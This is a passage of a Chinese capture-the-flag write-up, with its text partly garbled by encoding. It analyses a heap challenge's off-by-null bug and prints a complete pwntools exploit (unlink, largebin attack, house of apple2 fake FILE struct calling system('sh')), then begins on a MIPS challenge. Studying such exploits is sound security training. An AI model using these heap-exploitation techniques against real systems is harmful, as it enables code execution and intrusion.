src="/EXP_FILE/d4f10393521856c62d8138efbcf1b3c5_MD5.jpeg"></p><h3 id="ç¨‹åºåˆ†æ-1"><a href="#ç¨‹åºåˆ†æ-1" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h3><ul><li>create<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">creat_garbage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> num<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you can only creat 10 garbage"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pls input the idx of garbage: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  num <span class="token operator">=</span> <span class="token function">get_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token comment">// è¾“å…¥indexï¼Œindexéœ€è¦&lt;9</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token operator">></span> <span class="token number">9</span> <span class="token operator">||</span> heaparray<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token function">fault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pls input the size of garbage: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token function">get_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;=</span> <span class="token number">0x40F</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token number">0x900</span> <span class="token punctuation">)</span>              <span class="token comment">// 0x40f&lt;size&lt;=0x900</span>    <span class="token function">fault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>buf <span class="token punctuation">)</span>    <span class="token function">fault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  heaparray<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  sizearray<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pls input the content of garbage: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">// ç®€å•ä½¿ç”¨readè¯»å…¥</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>delete<br>æ— æ¼æ´ï¼Œç•¥</li><li>show<br>æ— æ¼æ´ï¼Œç•¥</li><li>edit<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">edit_garbage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> num<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pls input the idx of garbage: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  num <span class="token operator">=</span> <span class="token function">get_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token operator">></span> <span class="token number">9</span> <span class="token operator">||</span> <span class="token operator">!</span>heaparray<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token operator">!</span>sizearray<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token function">fault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pls input the new content of garbage: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">vuln_read</span><span class="token punctuation">(</span>heaparray<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>sizearray<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>çœ‹ä¸€ä¸‹è¿™ä¸ªvuln_readï¼š<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">vuln_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+13h] [rbp-Dh] BYREF</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-Ch]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    buf <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token function">fault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> <span class="token char">'\n'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v5 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>ä¸€ä¸ªoff by null</li></ul><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>åªèƒ½ç”³è¯·large sizeçš„chunkï¼Œä¸€ä¸ªoff by null<br>å¼€å§‹çš„æ€è·¯ï¼šé«˜ç‰ˆæœ¬off by nullé€ æˆå †å ï¼Œlargebin attackæ‰“ä¸€ä¸ªhouse of apple2<br>    ä½†æ˜¯æœ¬é¢˜é™åˆ¶äº†9ä¸ªå †å—ï¼Œoff by nullæ‰“largebin attackæ ¹æœ¬ä¸å¤Ÿç”¨<br>wpçš„æ€è·¯ï¼šé«˜ç‰ˆæœ¬off by nullï¼Œä½†æ˜¯unlinkã€‚ç”±äºæ²¡æœ‰å¼€pieï¼Œå¯ä»¥ç›´æ¥unlinkæ‰“heaparrayä»è€Œèƒ½å¤Ÿä»»æ„åœ°å€å†™ã€‚æ¥ç€house of apple2å³å¯</p><pre class="line-numbers language-python" data-language="python"><div class="caption"><span>TI:"å®˜æ–¹WP"</span></div><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> syscontext<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> flag<span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./challenge"</span><span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>ti <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>leak <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">"--->"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'4'</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token number">0x404060</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x428</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x4f0</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x421</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4040c0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x520</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x520</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x508</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x510</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x600</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x520</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">b'Content: '</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1a61</span>leak<span class="token punctuation">(</span><span class="token string">"heap_base"</span><span class="token punctuation">,</span>heap_base<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x510</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x21a161</span>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x600</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x418</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x4f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x418</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x531</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x21a110</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0xfe0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x404040</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x600</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>fake_io_addr <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x1a20</span>fake_IO_struct <span class="token operator">=</span> <span class="token string">b'  sh;\x00\x00\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x521</span><span class="token punctuation">)</span>              <span class="token comment">#rdi</span>fake_IO_struct <span class="token operator">=</span> fake_IO_struct<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>fake_IO_struct <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                             <span class="token comment">#_flag2</span>fake_IO_struct <span class="token operator">=</span> fake_IO_struct<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>fake_IO_struct <span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0x200</span><span class="token punctuation">)</span>             <span class="token comment">#_lock = a writable address</span>fake_IO_struct <span class="token operator">=</span> fake_IO_struct<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>fake_IO_struct <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_io_addr <span class="token operator">+</span> <span class="token number">0x200</span><span class="token punctuation">)</span>          <span class="token comment">#fake_wide_data</span>fake_IO_struct <span class="token operator">=</span> fake_IO_struct<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>fake_IO_struct <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_wfile_jumps'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x20</span><span class="token punctuation">)</span>        <span class="token comment">#fake_vatable</span>fake_IO_struct <span class="token operator">=</span> fake_IO_struct<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>fake_IO_struct <span class="token operator">+=</span> <span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0xe0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_io_addr <span class="token operator">+</span> <span class="token number">0x2e0</span><span class="token punctuation">)</span>fake_IO_struct <span class="token operator">+=</span> <span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x500</span> <span class="token operator">+</span> fake_IO_structedit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x608</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'9'</span><span class="token punctuation">)</span>leak<span class="token punctuation">(</span><span class="token string">"libc.address"</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>leak<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'1800'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="shaopi"><a href="#shaopi" class="headerlink" title="shaopi"></a>shaopi</h2><p>MIPS32ï¼Œé™æ€é“¾æ¥<br><img src="/EXP_FILE/ee46d45cf538036ef86cdd08676b3dca_MD5.jpeg"></p><p>ä¿æŠ¤ä¸€çœ‹ï¼Œå¤šåŠæ˜¯shellcode<br><img src="/EXP_FILE/31f02354431998877e3bc1b3f531fbc7_MD5.jpeg"></p><h3 id="ç¨‹åºåˆ†æ-2"><a href="#ç¨‹åºåˆ†æ-2" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h3><p>æ‰¾åˆ°startå‡½æ•°ï¼Œç¡®å®šç¨‹åºmainå‡½æ•°ä½ç½®<br><img src="/EXP_FILE/572b1375526780c2df45c0b58b78f507_MD5.jpeg"></p><ul><li>main<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_400B38</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [sp+18h] [+18h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [sp+1Ch] [+1Ch]</span>  <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [sp+20h] [+20h] BYREF</span>  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [sp+50h] [+50h] BYREF</span>  <span class="token function">sub_400A94</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span 